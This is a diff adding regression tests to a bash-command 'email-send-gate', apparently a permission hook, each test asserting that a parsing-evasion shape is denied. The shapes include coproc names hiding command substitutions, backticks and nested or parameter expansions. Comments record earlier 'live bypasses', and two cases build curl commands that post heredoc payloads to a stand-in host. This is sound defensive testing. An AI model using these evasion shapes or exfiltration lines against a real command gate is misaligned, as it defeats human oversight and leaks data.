@@ -1255,11 +1255,77 @@ describe('email-send-gate: ONE concept, ONE character class -- the function NAME
     expect(bash(fn("coproc f'' { case x in x)", ';; esac; }; wait)')).deny).toBe(true)
   })
 
+  it('N15: a coproc NAME containing a command substitution -- f$(y)', () => {
+    // Cybersec, round 11. `coproc` validates its NAME after EXPANSION, so with `y` producing nothing
+    // this starts a coproc called `f`. Measured executing.
+    expect(bash(fn('coproc f$(y) { case x in x)', ';; esac; }; wait)')).deny).toBe(true)
+  })
+
+  it('N16: the same through a backtick -- f`g`', () => {
+    expect(bash(fn('coproc f`g` { case x in x)', ';; esac; }; wait)')).deny).toBe(true)
+  })
+
+  it('N17: NESTED substitution in the name -- f$(y $(z))', () => {
+    // The reason the NAME had to stop being a character class. This one is out of reach of any
+    // single-level regex, and it is live and executing: 6 of the 10 shapes measured in this round
+    // nest, and the reported fix would have closed 4 of them.
+    expect(bash(fn('coproc f$(y $(z)) { case x in x)', ';; esac; }; wait)')).deny).toBe(true)
+  })
+
+  it('N18: a backtick inside a substitution, and a substitution inside a backtick', () => {
+    const failures: string[] = []
+    for (const n of ['f$(echo `g`)', 'f`echo $(y)`']) {
+      if (!bash(fn(`coproc ${n} { case x in x)`, ';; esac; }; wait)')).deny) failures.push(n)
+    }
+    expect(failures).toEqual([])
+  })
+
+  it('N19: a parameter expansion carrying a substitution -- f${u:-$(y)}', () => {
+    expect(bash(fn('coproc f${u:-$(y)} { case x in x)', ';; esac; }; wait)')).deny).toBe(true)
+  })
+
+  it('N20: an arithmetic expansion in the name -- f$((0))', () => {
+    expect(bash(fn('coproc f$((0)) { case x in x)', ';; esac; }; wait)')).deny).toBe(true)
+  })
+
+  it('N21: several runs, and a run followed by plain text', () => {
+    const failures: string[] = []
+    for (const n of ['f$(y)$(z)', 'f$(y)g']) {
+      if (!bash(fn(`coproc ${n} { case x in x)`, ';; esac; }; wait)')).deny) failures.push(n)
+    }
+    expect(failures).toEqual([])
+  })
+
+  it('N-R5: an UNTERMINATED run in the name must not be consumed', () => {
+    // The scanner returns "no word" rather than running to end-of-input, so an unterminated `$(`,
+    // backtick or quote leaves the boundary where it was instead of swallowing the rest of the
+    // command -- including a heredoc that another interpreter owns.
+    const cmd = [
+      `curl -s http://127.0.0.1:1/x -d @- $(coproc f\`g { python3 - curl -d @- <<'PY'`,
+      EVIL10,
+      'PY',
+      '}; wait)',
+    ].join(NL)
+    expect(bash(cmd).deny).toBe(true)
+  })
+
+  it('N22: a `${ }` in the name whose BODY carries a metacharacter -- f${u/;/}', () => {
+    // Mutation testing again: with `${ }` unread, the scan stops at the `;` inside the braces, the
+    // name ends early and the boundary never clears it. The other `${ }` shapes cannot show this,
+    // because a body containing a metacharacter usually stops the name being an identifier at all --
+    // this one survives quote removal as `f` and really starts a coproc. Measured executing.
+    expect(bash(fn('coproc f${u/;/} { case x in x)', ';; esac; }; wait)')).deny).toBe(true)
+  })
+
   it('N-R4: an UNBALANCED quote in the name must not be consumed', () => {
-    // The sharpest edge on admitting quotes at all: this rule moves `boundary` but never touches the
-    // walker's `quote` state, so a match that swallowed a lone `"` would leave the walker unquoted
-    // while bash is inside a string -- a worse desynchronisation than the gap it closes. Only
-    // BALANCED segments are part of the class, which is also what bash's word grammar says.
+    // CORRECTED RATIONALE (Cybersec, round 11). This test used to justify itself with "swallowing a
+    // lone quote would leave the WALKER unquoted while bash is inside a string". That is not how the
+    // rule works: the call site moves `boundary` only, never `i`, so the main loop still walks every
+    // swallowed character and keeps `quote` and the nest stack correct. A desynchronisation cannot
+    // arise this way. The real -- smaller -- hazard is that `boundary` lands in the MIDDLE of a
+    // quoted run, so the span starts at half a string. The conservative behaviour is unchanged and
+    // still right; only the reason was wrong, and it is worth correcting because that wrong reason is
+    // what kept backticks out of the name and left four live bypasses in round 10.
     const cmd = [
       `curl -s http://127.0.0.1:1/x -d @- $(f"()" () { python3 - curl -d @- <<'PY'`,
       EVIL10,
